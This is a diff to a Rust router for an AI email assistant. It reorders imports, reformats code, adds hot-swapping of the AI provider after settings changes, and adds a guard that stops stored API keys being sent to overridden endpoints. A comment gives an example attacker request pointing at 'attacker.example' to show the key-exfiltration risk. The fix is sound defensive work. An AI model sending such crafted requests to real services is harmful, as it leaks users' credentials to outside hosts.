@@ -42,33 +42,33 @@ use futures::executor::block_on;
 use serde_json::{json, Value};
 
 use mailmate_ai::http::HttpClient;
-use mailmate_ai::providers::list_models;
+use mailmate_ai::providers::{list_models, SwappableProvider};
 use mailmate_common::action::{GuardedActionPlan, PlannedAction};
 use mailmate_common::actor::Actor;
-use mailmate_common::classification::Classification;
 use mailmate_common::audit::{event_type, AuditEntry, AuditQuery};
+use mailmate_common::classification::Classification;
 use mailmate_common::correction::UserCorrection;
-use mailmate_common::feedback::{
-    FeedbackPolarity, FilingFeedback, FilingFeedbackRow, PinnedVersions, TaskFeedback,
-};
 use mailmate_common::curator::ReviewDecision;
 use mailmate_common::error::TransportError;
 use mailmate_common::features::FeatureVector;
+use mailmate_common::feedback::{
+    FeedbackPolarity, FilingFeedback, FilingFeedbackRow, PinnedVersions, TaskFeedback,
+};
 use mailmate_common::ids::{
     AccountId, FolderId, MessageId, ProposalId, ReminderId, RuleId, ThreadId,
 };
-use mailmate_common::reminder::NewReminder;
-use mailmate_common::time::Timestamp;
 use mailmate_common::mail::MailAction;
 use mailmate_common::message::NewMessage;
 use mailmate_common::pipeline::PipelineItemQuery;
 use mailmate_common::policy::TriggerKind;
 use mailmate_common::proposal::{ProposalStatus, ProposalTrigger};
 use mailmate_common::protocol::{Frame, ProtocolVersion};
+use mailmate_common::reminder::NewReminder;
 use mailmate_common::reply::ReplyDraftRequest;
-use mailmate_common::rules::rule::{RuleKind, RuleStatus};
 use mailmate_common::retention::RetentionLevel;
+use mailmate_common::rules::rule::{RuleKind, RuleStatus};
 use mailmate_common::secret::{Secret, SecretKey};
+use mailmate_common::time::Timestamp;
 use mailmate_common::workflow::{ExitEvent, WorkflowInstanceStatus};
 use mailmate_core::{
     CorrectionContext, CorrectionService, DraftService, ImportExportService, ImportSummary,
@@ -85,8 +85,8 @@ use mailmate_ports::rule_engine::RuleEngine;
 use mailmate_ports::secret_store::SecretStore;
 use mailmate_ports::storage::data_rights::DataRightsRepository;
 use mailmate_ports::storage::messages::MessageRepository;
-use mailmate_ports::storage::reminders::ReminderRepository;
 use mailmate_ports::storage::pipeline_items::PipelineItemRepository;
+use mailmate_ports::storage::reminders::ReminderRepository;
 use mailmate_ports::storage::rules::RuleRepository;
 use mailmate_ports::storage::workflows::WorkflowInstanceRepository;
 use mailmate_ports::storage::{AuditRepository, ProposalRepository};
@@ -101,7 +101,6 @@ use crate::convert::{
 };
 use crate::dispatch::{error_response, ok_response, SUPPORTED_PROTOCOL_VERSION};
 use crate::native_stdio::read_frame;
-use crate::provider::provider_is_configured;
 use crate::protocol_dto::{
     CancelSequencePayload, ClassifyMessagePayload, DraftReplyPayload, EnrollPipelineItemPayload,
     ExplainDecisionPayload, ListFollowupsPayload, ListRecentActivityPayload,
@@ -109,6 +108,7 @@ use crate::protocol_dto::{
     ReviewFollowupPayload, ReviewRuleProposalPayload, SentMailPayload, TriageExistingMailPayload,
     UpdatePipelineStagePayload,
 };
+use crate::provider::provider_is_configured;
 
 /// The follow-up engine + repository ports the router needs to serve the sales-pipeline
 /// control requests and drain due steps. They live outside the core's [`Ports`] (the core
@@ -150,6 +150,12 @@ pub struct AdminSuite {
     /// here so the management surface can probe a provider's catalog endpoint *before* a model is
     /// chosen — model discovery cannot wait for a fully-built provider (which already needs one).
     pub http: Arc<dyn HttpClient>,
+    /// The live, hot-swappable provider every provider-typed collaborator holds (drafter, curator,
+    /// training evaluator). A `set_provider`/`set_secret` write rebuilds from the updated config +
+    /// secrets and swaps the backing adapter in here, so the change takes effect on the next draft
+    /// with no host restart. `None` in a router without a live provider graph (e.g. admin-only
+    /// tests), where settings writes simply skip the rebuild.
+    pub live_provider: Option<Arc<SwappableProvider>>,
 }
 
 impl AdminSuite {
@@ -173,11 +179,37 @@ impl AdminSuite {
         }
     }
 
+    /// Rebuild the live provider from the current `[ai]` config + stored secrets and hot-swap it
+    /// into every provider-typed collaborator in place (no host restart). Called after a
+    /// `set_provider`/`set_secret` write succeeds, so a provider added or keyed from Settings is
+    /// used by the very next `draft_reply` — closing the gap where `get_settings` reported the new
+    /// default while the drafter/curator/training evaluator still used the old (often unavailable)
+    /// adapter until a restart. A no-op when no live provider handle is wired (an admin-only test
+    /// router). `build_provider` reads secrets synchronously, mirroring `provider_status`, which
+    /// already does so from its async handler.
+    fn rebuild_live_provider(&self) {
+        let Some(live) = &self.live_provider else {
+            return;
+        };
+        let ai = self.config.lock().unwrap().ai.clone();
+        let next =
+            crate::provider::build_provider(&ai, self.secret_store.as_ref(), self.http.clone());
+        log::info!(
+            "rebuilt live provider after a settings write: now serving id={}",
+            next.id()
+        );
+        live.swap(next);
+    }
+
     /// Resolve the `(kind, endpoint, api_key)` a discovery/probe request targets: from an explicit
     /// `kind` + `endpoint` in the payload, falling back to a saved provider's settings when only a
-    /// `provider_id` is given (and attaching that provider's stored key). Shared by `list_models`
-    /// and `test_provider` so both resolve a target identically. Returns the human-readable tail of
-    /// the error the caller surfaces when neither path yields a kind + non-empty endpoint.
+    /// `provider_id` is given. Shared by `list_models` and `test_provider` so both resolve a target
+    /// identically. Returns the human-readable tail of the error the caller surfaces when neither
+    /// path yields a kind + non-empty endpoint.
+    ///
+    /// The stored API key is bound to the provider's **own saved endpoint**: it is attached only
+    /// when the resolved endpoint is exactly that saved endpoint, never to a payload `endpoint`
+    /// override (see the SSRF / key-exfiltration guard below).
     async fn resolve_discovery_target(
         &self,
         payload: &Value,
@@ -203,27 +235,38 @@ impl AdminSuite {
             .and_then(Value::as_str)
             .map(str::to_owned)
             .or_else(|| saved.as_ref().map(|p| p.kind.clone()));
+        let saved_endpoint = saved.as_ref().and_then(|p| p.endpoint.clone());
         let endpoint = payload
             .get("endpoint")
             .and_then(Value::as_str)
             .map(str::to_owned)
-            .or_else(|| saved.as_ref().and_then(|p| p.endpoint.clone()));
+            .or_else(|| saved_endpoint.clone());
         let (Some(kind), Some(endpoint)) = (kind, endpoint) else {
-            return Err("requires kind and endpoint (or a saved provider_id that has them)".to_owned());
+            return Err(
+                "requires kind and endpoint (or a saved provider_id that has them)".to_owned(),
+            );
         };
         if endpoint.trim().is_empty() {
             return Err("requires a non-empty endpoint".to_owned());
         }
-        // Attach the stored API key for an authenticated (cloud) catalog, when we know which
-        // provider it is. A store read error degrades to "no key" (a local catalog needs none).
+        // SSRF / key-exfiltration guard: the stored key is bound to the provider's OWN saved
+        // endpoint. Attach it ONLY when the resolved endpoint is exactly that saved endpoint —
+        // never to a payload `endpoint` override. Otherwise a crafted request like
+        // `{ provider_id: "openai", endpoint: "https://attacker.example/v1" }` would send
+        // `Authorization: Bearer <saved key>` to an arbitrary host. Probing a different (or
+        // not-yet-saved) endpoint still works for discovery — just without the key. A store read
+        // error degrades to "no key" (a local catalog needs none).
+        let targets_saved_endpoint = saved_endpoint
+            .as_deref()
+            .is_some_and(|saved| saved.trim() == endpoint.trim());
         let api_key = match provider_id {
-            Some(id) => self
+            Some(id) if targets_saved_endpoint => self
                 .secret_store
                 .get(Self::secret_key(id))
                 .await
                 .ok()
                 .flatten(),
-            None => None,
+            _ => None,
         };
         Ok((kind, endpoint, api_key))
     }
@@ -476,7 +519,11 @@ impl HostRouter {
     /// drain nudges (a zero or unset cap falls back to the default). A router without it answers
     /// those requests with not-configured and its reminder drain is a no-op.
     #[must_use]
-    pub fn with_reminders(mut self, reminders: Arc<dyn ReminderRepository>, batch_cap: usize) -> Self {
+    pub fn with_reminders(
+        mut self,
+        reminders: Arc<dyn ReminderRepository>,
+        batch_cap: usize,
+    ) -> Self {
         self.reminders = Some(reminders);
         if batch_cap > 0 {
             self.reminder_batch_cap = batch_cap;
@@ -497,12 +544,9 @@ impl HostRouter {
         let Some(id) = message.id.clone() else {
             return;
         };
-        let retention = self
-            .admin
-            .as_ref()
-            .map_or(RetentionLevel::Metadata, |a| {
-                a.config.lock().unwrap().retention_level()
-            });
+        let retention = self.admin.as_ref().map_or(RetentionLevel::Metadata, |a| {
+            a.config.lock().unwrap().retention_level()
+        });
         let from = &message.headers.from;
         let sender_domain = from
             .rsplit_once('@')
@@ -540,7 +584,13 @@ impl HostRouter {
         let Some(messages) = &self.messages else {
             return;
         };
-        if admin.config.lock().unwrap().retention_level().retains_body() {
+        if admin
+            .config
+            .lock()
+            .unwrap()
+            .retention_level()
+            .retains_body()
+        {
             return;
         }
         match messages.purge_bodies().await {
@@ -809,7 +859,9 @@ impl HostRouter {
             CategoryPolicy::Off => (silence_actions(outcome), Vec::new()),
             CategoryPolicy::Suggest => (demote_to_suggestions(outcome), Vec::new()),
             CategoryPolicy::Auto => {
-                let applied = self.apply_allowed(&outcome.guarded_plan, &origin_folder).await;
+                let applied = self
+                    .apply_allowed(&outcome.guarded_plan, &origin_folder)
+                    .await;
                 (outcome, applied)
             }
         };
@@ -893,8 +945,8 @@ impl HostRouter {
         message: &mailmate_common::mail::MessageData,
     ) -> Option<FilingFeedbackRow> {
         let folder = message.folder_id.as_str();
-        let is_inbox = folder.eq_ignore_ascii_case("inbox")
-            || folder.to_ascii_lowercase().ends_with("/inbox");
+        let is_inbox =
+            folder.eq_ignore_ascii_case("inbox") || folder.to_ascii_lowercase().ends_with("/inbox");
         if is_inbox {
             return None;
         }
@@ -1090,7 +1142,12 @@ impl HostRouter {
                     }),
                 ))
             }
-            Err(e) => self.send(error_response(request_id, "draft_failed", e.to_string(), None)),
+            Err(e) => self.send(error_response(
+                request_id,
+                "draft_failed",
+                e.to_string(),
+                None,
+            )),
         }
     }
 
@@ -1590,15 +1647,28 @@ impl HostRouter {
         };
         let rules_port = reload.rules.as_ref();
         let mut rules =
-            match crate::runtime::rule_manager_snapshot(rules_port, RuleKind::Classification).await {
+            match crate::runtime::rule_manager_snapshot(rules_port, RuleKind::Classification).await
+            {
                 Ok(r) => r,
                 Err(e) => {
-                    return self.send(error_response(request_id, "list_rules_failed", e.to_string(), None))
+                    return self.send(error_response(
+                        request_id,
+                        "list_rules_failed",
+                        e.to_string(),
+                        None,
+                    ))
                 }
             };
         match crate::runtime::rule_manager_snapshot(rules_port, RuleKind::Action).await {
             Ok(action) => rules.extend(action),
-            Err(e) => return self.send(error_response(request_id, "list_rules_failed", e.to_string(), None)),
+            Err(e) => {
+                return self.send(error_response(
+                    request_id,
+                    "list_rules_failed",
+                    e.to_string(),
+                    None,
+                ))
+            }
         }
 
         let mut cards = Vec::with_capacity(rules.len());
@@ -1654,9 +1724,15 @@ impl HostRouter {
                 None,
             ));
         };
-        let Some(rule_id) = payload.get("rule_id").and_then(Value::as_str).filter(|s| !s.is_empty())
+        let Some(rule_id) = payload
+            .get("rule_id")
+            .and_then(Value::as_str)
+            .filter(|s| !s.is_empty())
         else {
-            return self.send(invalid_payload_msg(request_id, "set_rule_status requires rule_id"));
+            return self.send(invalid_payload_msg(
+                request_id,
+                "set_rule_status requires rule_id",
+            ));
         };
         let Some(kind) = payload
             .get("kind")
@@ -1668,9 +1744,15 @@ impl HostRouter {
                 "set_rule_status requires kind ∈ classification|action",
             ));
         };
-        let Some(status) = payload.get("status").and_then(Value::as_str).and_then(RuleStatus::from_db_str)
+        let Some(status) = payload
+            .get("status")
+            .and_then(Value::as_str)
+            .and_then(RuleStatus::from_db_str)
         else {
-            return self.send(invalid_payload_msg(request_id, "set_rule_status: unknown status"));
+            return self.send(invalid_payload_msg(
+                request_id,
+                "set_rule_status: unknown status",
+            ));
         };
         // Only the user-settable target statuses: enable (active), pause to shadow, or disable. The
         // lifecycle-internal statuses are not reachable from the manager (they would skip review).
@@ -1688,12 +1770,18 @@ impl HostRouter {
         // promote a `draft`/`pending_human_review`/`rejected`/`retired` rule into `active`, which
         // would bypass the proposal-review materialization gate. We confirm the CURRENT status by
         // checking the rule is in the manager snapshot; if it is not, refuse.
-        let manageable = match crate::runtime::rule_manager_snapshot(reload.rules.as_ref(), kind).await {
-            Ok(snapshot) => snapshot.iter().any(|r| r.rule_id.as_str() == rule_id),
-            Err(e) => {
-                return self.send(error_response(request_id, "set_rule_status_failed", e.to_string(), None))
-            }
-        };
+        let manageable =
+            match crate::runtime::rule_manager_snapshot(reload.rules.as_ref(), kind).await {
+                Ok(snapshot) => snapshot.iter().any(|r| r.rule_id.as_str() == rule_id),
+                Err(e) => {
+                    return self.send(error_response(
+                        request_id,
+                        "set_rule_status_failed",
+                        e.to_string(),
+                        None,
+                    ))
+                }
+            };
         if !manageable {
             return self.send(error_response(
                 request_id,
@@ -1707,7 +1795,12 @@ impl HostRouter {
             .update_rule_status(&RuleId::from(rule_id), kind, status)
             .await
         {
-            return self.send(error_response(request_id, "set_rule_status_failed", e.to_string(), None));
+            return self.send(error_response(
+                request_id,
+                "set_rule_status_failed",
+                e.to_string(),
+                None,
+            ));
         }
         // Enabling a rule here is a real activation — stamp `rule_activated` so the audit timeline
         // has an activation reference for it. Without this, a rule promoted to Active from the Rules
@@ -1717,15 +1810,24 @@ impl HostRouter {
         if status == RuleStatus::Active {
             let entry = AuditEntry::new(event_type::RULE_ACTIVATED, Actor::User)
                 .with_rule(kind, RuleId::from(rule_id))
-                .with_payload(json!({ "to": RuleStatus::Active.as_str(), "source": "rules_manager" }));
+                .with_payload(
+                    json!({ "to": RuleStatus::Active.as_str(), "source": "rules_manager" }),
+                );
             if let Err(e) = self.audit.append(entry).await {
-                log::warn!("rule_activated audit write failed (staleness reference may be missing): {e}");
+                log::warn!(
+                    "rule_activated audit write failed (staleness reference may be missing): {e}"
+                );
             }
         }
         // Hot-reload so the new status is live at once (an enabled rule fires now; a disabled one
         // stops firing now) — never on the next restart.
         if let Err(e) = self.reload_rules().await {
-            return self.send(error_response(request_id, "rule_reload_failed", e.to_string(), None));
+            return self.send(error_response(
+                request_id,
+                "rule_reload_failed",
+                e.to_string(),
+                None,
+            ));
         }
         self.send(ok_response(
             request_id,
@@ -1770,7 +1872,8 @@ impl HostRouter {
             "precision_gate": report.precision_gate,
         });
         // The auditable record that the gate flipped active only above threshold.
-        let entry = AuditEntry::new(event_type::TIER2_TRAINED, Actor::System).with_payload(metrics.clone());
+        let entry =
+            AuditEntry::new(event_type::TIER2_TRAINED, Actor::System).with_payload(metrics.clone());
         if let Err(e) = self.audit.append(entry).await {
             log::warn!("tier2_trained audit write failed: {e}");
         }
@@ -2070,11 +2173,16 @@ impl HostRouter {
             // Only mark fired AFTER the nudge is on the wire (a failed send above returns early,
             // leaving the reminder pending to retry next drain).
             if let Err(e) = reminders.mark_fired(&reminder.id, now).await {
-                log::warn!("reminder {} fired-notification sent but mark_fired failed: {e}", reminder.id);
+                log::warn!(
+                    "reminder {} fired-notification sent but mark_fired failed: {e}",
+                    reminder.id
+                );
                 continue;
             }
             let mut entry = AuditEntry::new(event_type::REMINDER_FIRED, Actor::System)
-                .with_payload(json!({ "reminder_id": reminder.id.as_str(), "title": reminder.title }));
+                .with_payload(
+                    json!({ "reminder_id": reminder.id.as_str(), "title": reminder.title }),
+                );
             if let Some(mid) = &reminder.message_id {
                 entry = entry.with_message(mid.clone());
             }
@@ -2470,10 +2578,15 @@ impl HostRouter {
             .put(AdminSuite::secret_key(provider_id), Secret::new(secret))
             .await
         {
-            Ok(()) => self.send(ok_response(
-                request_id,
-                json!({ "stored": true, "provider_id": provider_id, "configured": true }),
-            )),
+            Ok(()) => {
+                // A newly-saved key can complete an otherwise-unauthenticated provider — rebuild
+                // the live graph so the next draft uses it without a host restart.
+                admin.rebuild_live_provider();
+                self.send(ok_response(
+                    request_id,
+                    json!({ "stored": true, "provider_id": provider_id, "configured": true }),
+                ))
+            }
             Err(e) => self.send(error_response(
                 request_id,
                 "set_secret_failed",
@@ -2551,6 +2664,9 @@ impl HostRouter {
         if let Err(e) = validation {
             return self.send(error_response(request_id, "invalid_payload", e, None));
         }
+        // The provider set/default changed — rebuild the live graph so the new default (or its
+        // removal, degrading to unavailable) takes effect on the next draft, no restart needed.
+        admin.rebuild_live_provider();
         self.respond_settings_write(request_id, admin)
     }
 
@@ -3176,7 +3292,11 @@ impl HostRouter {
     /// indexed `rule_id` column), so the Rules manager can count corrections per rule. This is the
     /// metric/provenance copy; the strong learning signal still flows to the feedback tables. Never
     /// fails the undo — a metric-row write error is swallowed.
-    async fn record_undo_provenance(&self, payload: &RecordUserActionPayload, message_id: &MessageId) {
+    async fn record_undo_provenance(
+        &self,
+        payload: &RecordUserActionPayload,
+        message_id: &MessageId,
+    ) {
         let Some(rule_id) = payload.rule_id.as_deref().filter(|s| !s.is_empty()) else {
             return;
         };
@@ -3188,7 +3308,9 @@ impl HostRouter {
         // SILENT loss would undercount the rule and read as a confident "0 corrections" — exactly
         // the misleading zero the manager promises to avoid — so a failure is logged, not hidden.
         if let Err(e) = self.audit.append(entry).await {
-            log::warn!("undo provenance audit write failed (rule correction count may undercount): {e}");
+            log::warn!(
+                "undo provenance audit write failed (rule correction count may undercount): {e}"
+            );
         }
     }
 
@@ -3643,8 +3765,14 @@ mod recipient_domain_tests {
 
     #[test]
     fn parses_plain_and_angle_bracketed_addresses_case_folded() {
-        assert_eq!(recipient_domain("boss@Acme.com").as_deref(), Some("acme.com"));
-        assert_eq!(recipient_domain("Boss <boss@Acme.com>").as_deref(), Some("acme.com"));
+        assert_eq!(
+            recipient_domain("boss@Acme.com").as_deref(),
+            Some("acme.com")
+        );
+        assert_eq!(
+            recipient_domain("Boss <boss@Acme.com>").as_deref(),
+            Some("acme.com")
+        );
     }
 
     #[test]
@@ -3661,6 +3789,10 @@ mod recipient_domain_tests {
         assert_eq!(recipient_domain("<@x>"), None, "no dot → not a domain");
         assert_eq!(recipient_domain("@x"), None);
         assert_eq!(recipient_domain("a@.com"), None, "empty label is invalid");
-        assert_eq!(recipient_domain("a@b@c.com").as_deref(), Some("c.com"), "last @ wins");
+        assert_eq!(
+            recipient_domain("a@b@c.com").as_deref(),
+            Some("c.com"),
+            "last @ wins"
+        );
     }
 }
